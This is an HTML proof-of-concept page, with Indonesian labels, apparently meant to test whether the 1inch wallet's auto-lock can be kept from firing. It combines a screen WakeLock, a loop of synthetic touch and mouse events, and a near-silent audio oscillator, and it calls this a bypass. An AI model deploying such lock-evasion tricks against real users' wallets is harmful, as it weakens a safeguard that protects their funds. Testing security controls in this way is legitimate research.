<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>PoC Auto-Lock FIX</title>
<style>
  body{font-family:-apple-system,monospace;background:#111;color:#0f0;padding:16px}
  .box{border:1px solid #0f0;border-radius:12px;padding:12px;margin:12px 0}
  #timer{font-size:48px;font-weight:900;text-align:center}
  button{width:100%;padding:16px;font-size:18px;font-weight:bold;background:#0f0;border:0;border-radius:12px;margin-top:10px}
  #log{font-size:12px;max-height:200px;overflow:auto;background:#000;padding:8px}
</style>
</head>
<body>

<h3>PoC Auto-Lock 1inch - FIX TIMER</h3>
<div class="box">
  <div id="timer">00:00</div>
  <div>Visibility: <b id="vis">unknown</b></div>
  <div>Active: <b id="active">0s</b></div>
  <div>WakeLock: <b id="wake">inactive</b></div>
</div>

<button id="btn">KLIK UNTUK MULAI TEST</button>
<div class="box" id="log">LOG READY...<br></div>

<script>
const $ = id => document.getElementById(id);
const logEl = $('log');
function log(msg){
  logEl.innerHTML += new Date().toLocaleTimeString() + ' - ' + msg + '<br>';
  logEl.scrollTop = logEl.scrollHeight;
}

let startTime = Date.now();
let wakeLock = null;
let fakeInterval = null;
let timerInterval = null;

function updateTimer(){
  const diff = Math.floor((Date.now() - startTime) / 1000);
  const m = String(Math.floor(diff/60)).padStart(2,'0');
  const s = String(diff%60).padStart(2,'0');
  $('timer').textContent = `${m}:${s}`;
  $('active').textContent = diff + 's';
}

// Timer anti-throttle iOS
timerInterval = setInterval(updateTimer, 100);
updateTimer();

document.addEventListener('visibilitychange', ()=>{
  $('vis').textContent = document.visibilityState;
  log('visibilitychange: ' + document.visibilityState);
});
$('vis').textContent = document.visibilityState;

$('btn').addEventListener('click', async () => {
  startTime = Date.now(); // reset timer pas klik
  log('User gesture diterima, mulai bypass...');
  
  // 1. WakeLock - harus di dalam click event di iOS
  try{
    if('wakeLock' in navigator){
      wakeLock = await navigator.wakeLock.request('screen');
      $('wake').textContent = 'ACTIVE';
      log('WakeLock ACTIVE');
      wakeLock.addEventListener('release', ()=>{ $('wake').textContent='released'; });
    } else {
      log('WakeLock tidak support di browser ini');
    }
  }catch(e){ log('WakeLock error: '+e.message); }

  // 2. Fake activity - ini inti bug nya
  if(fakeInterval) clearInterval(fakeInterval);
  fakeInterval = setInterval(()=>{
    window.dispatchEvent(new Event('touchstart'));
    document.dispatchEvent(new Event('mousemove'));
    // ini yang bikin auto-lock 1inch gagal reset
  }, 800);
  log('Fake activity loop jalan tiap 800ms');

  // 3. Silent audio - harus setelah click di iOS
  try{
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    gain.gain.value = 0.0001;
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    log('Silent audio started (gain 0.0001)');
  }catch(e){ log('Audio error: '+e.message); }

  $('btn').textContent = 'TEST BERJALAN... JANGAN SENTUH HP';
  log('TEST MULAI. Diamkan 2 menit. Kalau wallet tidak lock = BUG CONFIRMED');
});

log('Siap. Klik tombol di atas untuk mulai.');
</script>
</body>
</html>
